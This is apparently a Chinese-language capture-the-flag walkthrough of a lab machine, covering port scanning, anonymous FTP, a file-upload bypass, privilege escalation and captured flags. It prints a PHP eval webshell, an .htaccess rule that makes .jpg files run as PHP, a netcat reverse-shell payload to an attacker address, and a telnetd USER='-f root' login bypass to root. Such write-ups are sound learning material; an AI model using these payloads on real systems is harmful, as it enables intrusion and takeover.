
![](images/Pasted%20image%2020260124195510.png)


# 1.信息搜索
```bash
~  nmap -sVC -p- 192.168.3.51                         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-24 19:45 CST
Nmap scan report for 192.168.3.51
Host is up (0.0013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.3.48
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 0        0              20 Jan 22 12:27 readme.txt
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:43:B0:88 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

看到`ftp`漏洞，采用`lftp`尝试登录,发现`readme.txt`
```bash
☁  ~  lftp 192.168.3.51
lftp 192.168.3.51:~> user ftp
密码: 
lftp ftp@192.168.3.51:~> user ftp
密码: 
lftp ftp@192.168.3.51:~> ls -la
dr-xr-xr-x    2 0        0            4096 Jan 22 12:27 .
dr-xr-xr-x    2 0        0            4096 Jan 22 12:27 ..
-r--r--r--    1 0        0              20 Jan 22 12:27 readme.txt
lftp ftp@192.168.3.51:/> cat readme.txt 
http://tmpfile.dsz/
20 bytes transferred
```

看到提示改下`hosts`，然后用`dirsearch`扫描下
```bash
☁  ~  dirsearch -u http://tmpfile.dsz/                                 
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_tmpfile.dsz/__26-01-24_20-06-21.txt

Target: http://tmpfile.dsz/

[20:06:21] Starting: 
[20:06:24] 403 -  276B  - /.ht_wsr.txt
[20:06:24] 403 -  276B  - /.htaccess.bak1
[20:06:24] 403 -  276B  - /.htaccess.orig
[20:06:24] 403 -  276B  - /.htaccess.sample
[20:06:24] 403 -  276B  - /.htaccess.save
[20:06:24] 403 -  276B  - /.htaccess_orig
[20:06:24] 403 -  276B  - /.htaccess_extra
[20:06:24] 403 -  276B  - /.htaccessBAK
[20:06:24] 403 -  276B  - /.htaccess_sc
[20:06:24] 403 -  276B  - /.htaccessOLD
[20:06:24] 403 -  276B  - /.htaccessOLD2
[20:06:24] 403 -  276B  - /.htm
[20:06:24] 403 -  276B  - /.html
[20:06:24] 403 -  276B  - /.htpasswd_test
[20:06:24] 403 -  276B  - /.htpasswds
[20:06:24] 403 -  276B  - /.httr-oauth
[20:06:26] 403 -  276B  - /.php
[20:07:04] 403 -  276B  - /server-status
[20:07:04] 403 -  276B  - /server-status/
[20:07:13] 301 -  312B  - /uploads  ->  http://tmpfile.dsz/uploads/
[20:07:13] 200 -  454B  - /uploads/
```

看到有`uploads`，发现111大佬的头像,这里明示了需要上传图片作为突破点
![](images/Pasted%20image%2020260124200918.png)
## 方法一
将`2.php`另存为`2.png`，上传后用蚁剑连接
```php
<?php @eval($_POST['cmd']);?>
```

![](images/Pasted%20image%2020260124205034.png)
`/opt`下发现密码
![](images/Pasted%20image%2020260124204905.png)
`Eecho:2VQzte2RBr8p8MuOA0Gw2Sum`


## 方法二
试了GIF89a   filename='reverse.php  phtml phar' 都不行

上传`.htaccess`,可以burp上传或者直接上传，内容是
```bash
AddType application/x-httpd-php .jpg
```
这行配置是 **Apache 服务器** 的专属指令，核心作用是**强制将 `.jpg` 后缀的文件当作 PHP 脚本解析执行**，而非默认的图片文件处理



![](images/Pasted%20image%2020260125193323.png)
然后上传`nc.jpg` 即可实现反弹, 将`nc.php`另存为`nc.jpg`即可
```php
<?php exec("busybox nc 192.168.3.4 1111 -e /bin/bash"); ?>
```
![](images/Pasted%20image%2020260125193634.png)



# 2.ssh

```bash
cat user.txt 
flag{user-c2fdb0243cc742b18dcb4e5e68eed318}
```

查找SUID文件提权
```bash
find / -user root -perm -4000 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

查看后台进程,可以看到本地23端口，像刚爆出漏洞的telnet 
https://mp.weixin.qq.com/s?__biz=Mzk0MDQzNzY5NQ==&mid=2247494187&idx=1&sn=a91383587d33514f16787771ad5ebb7c&chksm=c3543eef0b49c5bff27c58a2c6154e256eced2f98a5a72cb9b73cd2579cafeb2b72dec675cee&mpshare=1&scene=23&srcid=0125VjcX4sgoiMS4vSYuzuSM&sharer_shareinfo=a2b798aab7f658305d3591e85f619072&sharer_shareinfo_first=a2b798aab7f658305d3591e85f619072#rd

```bash
ps -ef
#或者
ss -tlnup
```
![](images/Pasted%20image%2020260125190812.png)

# 3.提权
```bash
Eecho@Happiness:~$ USER='-f root';busybox telnet -a 127.0.0.1 23

Entering character mode
Escape character is '^]'.


Linux 4.19.0-27-amd64 (localhost) (pts/1)

Last login: Thu Jan 22 23:44:10 EST 2026 from 192.168.1.12 on pts/0
Linux Happiness 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@Happiness:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Happiness:~# cd /root
root@Happiness:~# ls -l
total 4
-rw-r--r-- 1 root root 44 Jan 22 12:59 root.txt
root@Happiness:~# cat root.txt 
flag{root-b52bb1635e544c3f968822ab6c7a745d}
```

## 漏洞基本信息

|   |   |
|---|---|
|漏洞编号|CVE-2026-24061|
|漏洞名称|GNU Inetutils telnetd 远程代码执⾏漏洞|
|漏洞类型|远程代码执⾏（RCE）|
|漏洞等级|⾼危 / Critical|
|影响组件|inetutils-telnetd|
|影响版本|≤ 2.7（修复版本之前）|
|协议端⼝|TCP / 23|
|是否需要认证|否|
|是否可远程利⽤|是|
